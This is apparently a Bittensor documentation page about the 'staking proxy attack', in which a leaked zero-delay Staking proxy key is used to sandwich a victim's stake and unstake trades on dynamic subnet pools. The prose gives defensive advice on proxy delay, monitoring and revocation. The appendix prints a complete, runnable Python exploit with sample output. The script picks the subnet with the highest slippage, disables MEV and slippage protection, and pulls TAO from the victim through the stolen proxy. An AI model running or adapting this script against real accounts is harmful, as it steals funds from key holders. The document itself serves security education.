---
title: "Avoid Staking Proxy Attacks"
---

import { SecurityWarning } from "../keys/_security-warning.mdx";

# Avoid Staking Proxy Attacks

A `Staking` proxy cannot move TAO with a simple balance transfer, so it is easy to underestimate what a leaked proxy key can do. If that proxy has no delay, whoever holds the delegate key can execute staking extrinsics immediately. On dynamic subnets, staking and unstaking route through the subnet pool, so large moves create slippage. An attacker with a stolen `Staking` proxy and their own TAO can arrange trades so the victim repeatedly receives worse prices while the attacker captures part of the spread.

For how proxies work, proxy types, and delay, start with the main overview: [Proxies: Overview](../keys/proxies/index.md).

<SecurityWarning />

This page explains the risk pattern and how to reduce it. It is not a guide to attacking third parties. Unauthorized use of someone else's keys or proxies is illegal; use testnet or your own accounts for any experimentation.

## What a Staking proxy can do

Proxy permissions are defined in the runtime; the overview above ties them to operational practice. A `Staking` proxy is allowed to call staking-related extrinsics (for example add and remove stake, swap stake, and move stake) on behalf of the real account. It does not need the real account's coldkey online to sign those calls; the delegate signs the outer `proxy` extrinsic.

What it typically cannot do is call plain `Balances` transfers on behalf of the real account. That narrow fact is what makes "it's only Staking" feel safe. It does not mean the victim's economic exposure is small.

## How the slippage pattern works

Dynamic subnets use a pool. Buying alpha (staking TAO) and selling alpha (unstaking to TAO) move that pool. The order and size of trades matter: the same operations at different times or in different sequences can clear at different effective prices.

A simplified mental model:

1. The attacker stakes some of their own TAO into a subnet (first leg).
2. Using the stolen `Staking` proxy, they stake a large amount of the victim's TAO into the same subnet and hotkey (second leg), moving the pool further.
3. The attacker unstakes their alpha (third leg).
4. Using the proxy again, they unstake the victim's alpha (fourth leg).

The victim's free TAO balance may look "normal" in the sense that funds were not sent to a stranger's address via `transfer`. The loss shows up as less TAO recovered after staking operations than they would have gotten without the sandwich, because of slippage and pool state. For background on slippage, see [Slippage](./slippage.md).

## Why delay and monitoring matter

A non-zero delay forces the delegate to announce a call and wait for a number of blocks before execution. During that window, the real account (for example from a hardware wallet) can reject the announcement. With zero delay, there is no such window: a leaked delegate key can act as fast as the chain accepts extrinsics.

Whether delay helps you in practice depends on whether you actually check for announcements on a schedule shorter than the delay. If you never look, a long delay only helps after the fact in forensics, not prevention.

## How to protect yourself

- Prefer scoped proxy types and non-zero delay for any delegate that can touch meaningful stake. See [Proxies: Overview](../keys/proxies/index.md) and [Working with Proxies](../keys/proxies/working-with-proxies.md).
- Treat a leaked `Staking` proxy like hot operational risk, not "low impact": rotate or remove the proxy, and assume stake-moving activity until you verify otherwise.
- Keep the custody coldkey off routine workstations; use the patterns in [Coldkey and Hotkey Workstation Security](../keys/coldkey-hotkey-security.md).
- Revoke proxies you are not actively using if you do not want ongoing monitoring burden.

## Learn more

- [Proxies: Overview](../keys/proxies/index.md) (main proxy documentation)
- [Working with Proxies](../keys/proxies/working-with-proxies.md)
- [Coldkey and Hotkey Workstation Security](../keys/coldkey-hotkey-security.md)
- [Slippage](./slippage.md)
- [Price protection](./price-protection.md)

## Appendix: Reference script (verbatim)

The following script is a proof-of-concept used for security education. It expects:

- Three roles: a victim coldkey (SS58 only), a delegate wallet that is a zero-delay `Staking` proxy for that victim, and a separate attacker wallet with its own TAO.
- A test (or local) network unless you change the code and accept mainnet risk.

Replace wallet names, SS58 addresses, and network with your own test configuration. Do not point it at accounts you do not control. For delays, proxy types, and monitoring, use the main guide: [Proxies: Overview](../keys/proxies/index.md).

The attacker leg uses a fixed `HACKER_STAKE_TAO` (10 τ in the copy below) so capital at risk on the attacker's side is bounded; the victim leg uses as much free TAO as the script allows after a small fee reserve, which better matches how a real attacker would try to move the pool without assuming the victim matches the attacker's size.

```
slippage-hack-demo.py
```
```
Hacker wallet:  5G4mxrN8msvc4jjwp7xoBrtAejTfAMLCMTFGCivY5inmySbq
Stolen proxy:   5F1TCdVcRWLYyKiS2kF2nBZ21EwQDDFr8hEqrDhRL6YvdtgQ
Victim account: 5ECaCSR1tEzcF6yDiribP1JVsw2ZTepZ1ZPy7xgk7yoUv69b

Staking proxy confirmed: victim 5ECaCSR1tEzc... → delegate 5F1TCdVcRWLY...

=== INITIAL STATE ===
  Hacker free TAO: τ1,304.232753676
  victim free TAO: τ45.698728115
  Hacker stake (fixed): 10.0 τ
  Victim stake (max this round): 45.198728 τ

Target subnet: netuid 315
  Picker: top 50 by price among subnets with tao_in ≥ 451.98728115 τ (10.0× sizing stake); then max slippage @ 45.198728 τ.
  TAO reserve:   τ729.825184782
  Alpha reserve: 584,234.912705817श
  Price:         τ0.001208481
  Est. slippage @ 10.0 τ (hacker leg): 4.57%
  Est. slippage @ 45.198728 τ (victim leg): 8.90%

Target hotkey: 5CJU4mP5kwxWCDFZ...

=== UNLOCK COLDKEYS (you will be prompted for each password below) ===

1) HACKER wallet — signs attacker add_stake / unstake
   Wallet name: 'PracticeKey!'
   Coldkey SS58: 5G4mxrN8msvc4jjwp7xoBrtAejTfAMLCMTFGCivY5inmySbq
Enter your password:
Decrypting...

2) STOLEN PROXY wallet — signs proxy() extrinsics for the victim
   Wallet name: 'zingo'
   Coldkey SS58: 5F1TCdVcRWLYyKiS2kF2nBZ21EwQDDFr8hEqrDhRL6YvdtgQ
Enter your password:
Decrypting...

Coldkeys unlocked. Starting rounds.

============================================================
  ROUND 1/1
============================================================
  Hacker leg: 10.0 τ  |  Victim leg: 45.198728 τ (max; leaves ≥0.5 τ free)

  [1] Hacker stakes 10.0 TAO into subnet 315...
      OK
  [2] Proxy: stake 45.198728 TAO from victim into subnet 315...
      OK — alpha price pumped
  [3] Hacker unstakes 8,148.888198512श alpha (sells at elevated price)...
      OK — profit captured
  [4] Proxy: unstake 34,024.993427745श alpha from victim (depressed price)...
      OK — victim gets less TAO back

  Round 1 result:
    Hacker: τ1,304.232753676 → τ1,305.583648293  (Δ +1.350895 TAO)
    Victim: τ45.698728115 → τ44.293819013  (Δ -1.404909 TAO)
    Victim free TAO lost: 1.404909  |  Hacker free TAO gained: 1.350895  |  Gap (fees / pool / rounding): 0.054014 TAO


============================================================
  FINAL RESULTS
============================================================
  Hacker: τ1,304.232753676 → τ1,305.583648293  (net +1.350895 TAO)
  Victim: τ45.698728115 → τ44.293819013  (net -1.404909 TAO)

  Hacker extracted: 1.350895 TAO
  Victim lost:      1.404909 TAO
  Gap (not to hacker): 0.054014 TAO
  Extraction rate:  3.07% of victim's starting balance
```



```python
"""

Proof-of-concept: slippage extraction attack using a stolen zero-delay Staking proxy.
Educational / security research tool. Run on testnet or local chain only.

Demonstrates that a Staking proxy — which cannot transfer TAO directly — can still
drain a victim's wallet through repeated sandwich attacks on low-liquidity subnet AMMs.

Three wallets involved:
    1. VICTIM ("victim") — the real account whose TAO gets drained.
       This coldkey lives on a hardware wallet. The attacker never has this key.
    2. STOLEN PROXY — the delegate coldkey that the victim authorized as a
       Staking proxy. This key was compromised (leaked from a hot machine, etc.).
    3. HACKER — the attacker's own wallet. Uses their own TAO to take the
       profitable side of each sandwich trade.

Prerequisites:
    1. A Staking proxy relationship: some delegate key is proxy for the victim.
       btcli proxy add --wallet.name victim --delegate PROXY_SS58 --proxy-type Staking --delay 0
    2. The attacker has obtained the proxy wallet (the delegate key).
    3. The attacker has their own funded wallet on the same network.

Attack loop (per round):
    1. Hacker stakes a fixed amount (``HACKER_STAKE_TAO``, default 10 τ) — not tied to victim size.
    2. Proxy stakes as much victim free TAO as allowed (balance minus fee reserve) → pumps the pool.
    3. Hacker unstakes; proxy unstakes victim → spread captured.

Subnet picker uses max(hacker leg, victim leg) so pool depth is sized for the larger trade.

Usage:
    Hardcoded wallets / ``rounds`` / ``HACKER_STAKE_TAO`` in ``main()``; adjust ``FEE_RESERVE_TAO`` if needed.
"""

import asyncio
import sys

import bittensor as bt
from bittensor.core.chain_data.proxy import ProxyType
from bittensor.core.extrinsics.pallets import SubtensorModule

# Subnet picker: skip dust pools; prefer slippage among liquid, high-price subnets.
TOP_N_SUBNETS_BY_PRICE = 50
MIN_TAO_RESERVE_STAKE_MULTIPLE = 10.0
# Leave free TAO on each coldkey for fees / existential balance between extrinsics.
FEE_RESERVE_TAO = 0.5
MIN_STAKE_TAO = 0.01
# Attacker's front-run leg: fixed size so capital at risk is bounded (not matched to victim's max stake).
HACKER_STAKE_TAO = 10.0


async def find_target_subnet(
    subtensor,
    stake_tao: float,
    *,
    top_n_by_price: int = TOP_N_SUBNETS_BY_PRICE,
    min_tao_reserve_multiple: float = MIN_TAO_RESERVE_STAKE_MULTIPLE,
):
    """Pick a subnet for the demo: liquid enough to not be pathological, then max slippage among high-price subnets.

    1. Keep non-root dynamic subnets with positive reserves and price.
    2. Require ``tao_in >= stake_tao * min_tao_reserve_multiple`` so the pool is not dust vs trade size.
    3. Sort by ``price.tao`` descending, take the first ``top_n_by_price``.
    4. Among those, choose the subnet with the highest ``tao_to_alpha_with_slippage(..., percentage=True)``
       for ``stake_tao`` (same sizing as the attack round).
    """
    all_subnets = await subtensor.all_subnets()
    if not all_subnets:
        return None

    min_tao = stake_tao * min_tao_reserve_multiple
    eligible = []
    for s in all_subnets:
        if s.netuid == 0 or not s.is_dynamic:
            continue
        if s.tao_in.tao <= 0 or s.alpha_in.tao <= 0:
            continue
        if s.price is None or s.price.tao <= 0:
            continue
        if s.tao_in.tao < min_tao:
            continue
        eligible.append(s)

    if not eligible:
        return None

    eligible.sort(key=lambda s: s.price.tao, reverse=True)
    top = eligible[:top_n_by_price]
    if not top:
        return None

    stake_bal = bt.Balance.from_tao(stake_tao)

    def stake_slippage_pct(s):
        return s.tao_to_alpha_with_slippage(tao=stake_bal, percentage=True)

    best = max(top, key=stake_slippage_pct)
    return best


async def find_hotkey_on_subnet(subtensor, netuid):
    """Get a registered hotkey on the target subnet to stake to."""
    meta = await subtensor.metagraph(netuid=netuid)
    if not meta.hotkeys:
        return None
    # Pick the first hotkey — any will do
    return meta.hotkeys[0]


async def get_alpha_balance(subtensor, coldkey_ss58, hotkey, netuid):
    """Query how much alpha a coldkey has staked to a hotkey on a subnet."""
    return await subtensor.get_stake(
        coldkey_ss58=coldkey_ss58,
        hotkey_ss58=hotkey,
        netuid=netuid,
    )


def compute_victim_stake_tao(victim_free_tao: float) -> float:
    """Max TAO the proxy can stake from the victim this round (free balance minus fee reserve)."""
    return max(0.0, victim_free_tao - FEE_RESERVE_TAO)


def subnet_sizing_stake_tao(victim_stake_tao: float) -> float:
    """Liquidity / slippage picker uses the larger of attacker leg and victim leg."""
    return max(HACKER_STAKE_TAO, victim_stake_tao)


async def main():
    # Hardcoded dev/testnet setup — extrinsics require bt.Wallet instances, not str names.
    hacker_wallet = bt.Wallet(name="Hacker")
    proxy_wallet = bt.Wallet(name="VictimProxy")
    hacker_ss58 = "<HackerWalletSS58>"
    proxy_ss58 = "<ProxySS58>"
    victim_ss58 = "<VictimSS58>"
    network = "test"
    rounds = 1
    print(f"Hacker wallet:  {hacker_ss58}")
    print(f"Stolen proxy:   {proxy_ss58}")
    print(f"Victim account: {victim_ss58}")
    print()

    async with bt.AsyncSubtensor(network=network) as subtensor:
        pallet = SubtensorModule(subtensor)

        # ── Verify proxy relationship exists ──────────────────────────────
        # The stolen proxy key must be a delegate for the victim's account
        proxies, _ = await subtensor.get_proxies_for_real_account(
            real_account_ss58=victim_ss58
        )
        has_staking_proxy = any(
            p.delegate == proxy_ss58 and p.proxy_type == "Staking" and p.delay == 0
            for p in proxies
        )
        if not has_staking_proxy:
            print(f"ERROR: No zero-delay Staking proxy from {victim_ss58} → {proxy_ss58}")
            print(f"Set one up first (from the victim's wallet):")
            print(f"  btcli proxy add --wallet.name victim --delegate {proxy_ss58} "
                  f"--proxy-type Staking --delay 0 --network {network}")
            sys.exit(1)
        print(f"Staking proxy confirmed: victim {victim_ss58[:12]}... → "
              f"delegate {proxy_ss58[:12]}...\n")

        # ── Balances first → victim max stake + subnet picker sizing ──────
        hacker_start = await subtensor.get_balance(hacker_ss58)
        victim_start = await subtensor.get_balance(victim_ss58)
        plan_victim_stake = compute_victim_stake_tao(victim_start.tao)
        if plan_victim_stake < MIN_STAKE_TAO:
            print(
                f"ERROR: Victim free TAO too low after {FEE_RESERVE_TAO} τ reserve.\n"
                f"  victim: {victim_start}\n"
                f"  Need at least ~{FEE_RESERVE_TAO + MIN_STAKE_TAO} τ free on victim."
            )
            sys.exit(1)
        if hacker_start.tao < HACKER_STAKE_TAO + FEE_RESERVE_TAO:
            print(
                f"ERROR: Hacker needs ≥ {HACKER_STAKE_TAO + FEE_RESERVE_TAO} τ "
                f"({HACKER_STAKE_TAO} τ stake + {FEE_RESERVE_TAO} τ reserve).\n"
                f"  Hacker: {hacker_start}"
            )
            sys.exit(1)

        plan_pick_tao = subnet_sizing_stake_tao(plan_victim_stake)

        print(f"=== INITIAL STATE ===")
        print(f"  Hacker free TAO: {hacker_start}")
        print(f"  victim free TAO: {victim_start}")
        print(f"  Hacker stake (fixed): {HACKER_STAKE_TAO} τ")
        print(f"  Victim stake (max this round): {plan_victim_stake:.6f} τ\n")

        # ── Find target subnet (sized to max leg) ─────────────────────────
        target = await find_target_subnet(subtensor, stake_tao=plan_pick_tao)
        if not target:
            print(
                "ERROR: No suitable subnet (dynamic, netuid>0, healthy tao_in vs stake, top-by-price pool)."
            )
            sys.exit(1)

        target_netuid = target.netuid
        print(f"Target subnet: netuid {target_netuid}")
        print(
            f"  Picker: top {TOP_N_SUBNETS_BY_PRICE} by price among subnets with "
            f"tao_in ≥ {plan_pick_tao * MIN_TAO_RESERVE_STAKE_MULTIPLE} τ "
            f"({MIN_TAO_RESERVE_STAKE_MULTIPLE}× sizing stake); then max slippage @ {plan_pick_tao:.6f} τ."
        )
        print(f"  TAO reserve:   {target.tao_in}")
        print(f"  Alpha reserve: {target.alpha_in}")
        print(f"  Price:         {target.price}")

        slip_h = target.tao_to_alpha_with_slippage(
            tao=bt.Balance.from_tao(HACKER_STAKE_TAO), percentage=True
        )
        slip_v = target.tao_to_alpha_with_slippage(
            tao=bt.Balance.from_tao(plan_victim_stake), percentage=True
        )
        print(f"  Est. slippage @ {HACKER_STAKE_TAO} τ (hacker leg): {slip_h:.2f}%")
        print(f"  Est. slippage @ {plan_victim_stake:.6f} τ (victim leg): {slip_v:.2f}%\n")

        # ── Find a hotkey to stake to ─────────────────────────────────────
        target_hotkey = await find_hotkey_on_subnet(subtensor, target_netuid)
        if not target_hotkey:
            print(f"ERROR: No hotkeys registered on subnet {target_netuid}.")
            sys.exit(1)
        print(f"Target hotkey: {target_hotkey[:16]}...\n")

        # Extrinsics call unlock internally with a generic prompt — label each unlock first.
        print("=== UNLOCK COLDKEYS (you will be prompted for each password below) ===\n")
        print("1) HACKER wallet — signs attacker add_stake / unstake")
        print(f"   Wallet name: {hacker_wallet.name!r}")
        print(f"   Coldkey SS58: {hacker_wallet.coldkeypub.ss58_address}")
        hacker_wallet.unlock_coldkey()
        print()
        print("2) STOLEN PROXY wallet — signs proxy() extrinsics for the victim")
        print(f"   Wallet name: {proxy_wallet.name!r}")
        print(f"   Coldkey SS58: {proxy_wallet.coldkeypub.ss58_address}")
        proxy_wallet.unlock_coldkey()
        print("\nColdkeys unlocked. Starting rounds.\n")

        # ── Attack loop ───────────────────────────────────────────────────
        for rnd in range(1, rounds + 1):
            print(f"{'='*60}")
            print(f"  ROUND {rnd}/{rounds}")
            print(f"{'='*60}")

            victim_bal = await subtensor.get_balance(victim_ss58)
            hacker_bal = await subtensor.get_balance(hacker_ss58)
            victim_stake_tao = compute_victim_stake_tao(victim_bal.tao)
            if victim_stake_tao < MIN_STAKE_TAO:
                print(
                    f"  Victim stake after reserve too small ({victim_stake_tao:.6f} τ). "
                    f"victim {victim_bal}. Stopping."
                )
                break
            if hacker_bal.tao < HACKER_STAKE_TAO + FEE_RESERVE_TAO:
                print(
                    f"  Hacker cannot cover {HACKER_STAKE_TAO} τ + reserve. {hacker_bal}. Stopping."
                )
                break

            hacker_leg_bal = bt.Balance.from_tao(HACKER_STAKE_TAO)
            victim_leg_bal = bt.Balance.from_tao(victim_stake_tao)
            victim_leg_rao = victim_leg_bal.rao
            print(
                f"  Hacker leg: {HACKER_STAKE_TAO} τ  |  "
                f"Victim leg: {victim_stake_tao:.6f} τ (max; leaves ≥{FEE_RESERVE_TAO} τ free)\n"
            )

            hacker_before = hacker_bal

            # Step 1: Hacker stakes own TAO (buys alpha at base price)
            print(f"  [1] Hacker stakes {HACKER_STAKE_TAO} TAO into subnet {target_netuid}...")
            resp = await subtensor.add_stake(
                wallet=hacker_wallet,
                netuid=target_netuid,
                hotkey_ss58=target_hotkey,
                amount=hacker_leg_bal,
                safe_staking=False,
                mev_protection=False,
            )
            if not resp.success:
                print(f"      FAILED: {resp.message}")
                break
            print(f"      OK")

            # Step 2: Via stolen proxy — stake victim's TAO (pumps alpha price)
            print(f"  [2] Proxy: stake {victim_stake_tao:.6f} TAO from victim into subnet {target_netuid}...")
            # AsyncSubtensor.compose_call is async — inner call must be awaited (see SubtensorModule docstring).
            add_call = await pallet.add_stake(
                netuid=target_netuid,
                hotkey=target_hotkey,
                amount_staked=victim_leg_rao,
            )
            resp = await subtensor.proxy(
                wallet=proxy_wallet,           # <-- stolen proxy key signs this
                real_account_ss58=victim_ss58,  # <-- acts on behalf of victim
                force_proxy_type=ProxyType.Staking,
                call=add_call,
                mev_protection=False,
            )
            if not resp.success:
                print(f"      FAILED: {resp.message}")
                break
            print(f"      OK — alpha price pumped")

            # Step 3: Hacker unstakes own alpha (sells at elevated price)
            hacker_alpha = await get_alpha_balance(
                subtensor, hacker_ss58, target_hotkey, target_netuid
            )
            if hacker_alpha.rao == 0:
                print(f"      Hacker has no alpha to unstake. Skipping.")
                continue

            print(f"  [3] Hacker unstakes {hacker_alpha} alpha (sells at elevated price)...")
            resp = await subtensor.unstake(
                wallet=hacker_wallet,
                netuid=target_netuid,
                hotkey_ss58=target_hotkey,
                amount=hacker_alpha,
                safe_unstaking=False,
                mev_protection=False,
            )
            if not resp.success:
                print(f"      FAILED: {resp.message}")
                break
            print(f"      OK — profit captured")

            # Step 4: Via stolen proxy — unstake victim's alpha (depressed price)
            victim_alpha = await get_alpha_balance(
                subtensor, victim_ss58, target_hotkey, target_netuid
            )
            if victim_alpha.rao == 0:
                print(f"      Victim has no alpha to unstake. Skipping.")
                continue

            print(f"  [4] Proxy: unstake {victim_alpha} alpha from victim (depressed price)...")
            remove_call = await pallet.remove_stake(
                netuid=target_netuid,
                hotkey=target_hotkey,
                amount_unstaked=victim_alpha.rao,
            )
            resp = await subtensor.proxy(
                wallet=proxy_wallet,           # <-- stolen proxy key signs this
                real_account_ss58=victim_ss58,  # <-- acts on behalf of victim
                force_proxy_type=ProxyType.Staking,
                call=remove_call,
                mev_protection=False,
            )
            if not resp.success:
                print(f"      FAILED: {resp.message}")
                break
            print(f"      OK — victim gets less TAO back")

            # ── Round summary ─────────────────────────────────────────────
            hacker_after = await subtensor.get_balance(hacker_ss58)
            victim_after = await subtensor.get_balance(victim_ss58)
            hacker_delta = hacker_after.tao - hacker_before.tao
            victim_delta = victim_after.tao - victim_bal.tao
            victim_lost_round = victim_bal.tao - victim_after.tao
            hacker_gained_round = hacker_after.tao - hacker_before.tao
            round_leak = victim_lost_round - hacker_gained_round

            print(f"\n  Round {rnd} result:")
            print(f"    Hacker: {hacker_before} → {hacker_after}  (Δ {hacker_delta:+.6f} TAO)")
            print(f"    Victim: {victim_bal} → {victim_after}  (Δ {victim_delta:+.6f} TAO)")
            print(
                f"    Victim free TAO lost: {victim_lost_round:.6f}  |  "
                f"Hacker free TAO gained: {hacker_gained_round:.6f}  |  "
                f"Gap (fees / pool / rounding): {round_leak:.6f} TAO"
            )
            print()

        # ── Final summary ─────────────────────────────────────────────────
        hacker_end = await subtensor.get_balance(hacker_ss58)
        victim_end = await subtensor.get_balance(victim_ss58)

        print(f"\n{'='*60}")
        print(f"  FINAL RESULTS")
        print(f"{'='*60}")
        print(f"  Hacker: {hacker_start} → {hacker_end}  (net {hacker_end.tao - hacker_start.tao:+.6f} TAO)")
        print(f"  Victim: {victim_start} → {victim_end}  (net {victim_end.tao - victim_start.tao:+.6f} TAO)")
        victim_lost_total = victim_start.tao - victim_end.tao
        hacker_gained_total = hacker_end.tao - hacker_start.tao
        total_leak = victim_lost_total - hacker_gained_total
        print(f"\n  Hacker extracted: {hacker_gained_total:.6f} TAO")
        print(f"  Victim lost:      {victim_lost_total:.6f} TAO")
        print(f"  Gap (not to hacker): {total_leak:.6f} TAO")
        extraction_rate = (
            victim_lost_total / victim_start.tao * 100
            if victim_start.tao > 0 else 0
        )
        print(f"  Extraction rate:  {extraction_rate:.2f}% of victim's starting balance")
        print()


if __name__ == "__main__":
    asyncio.run(main())

```
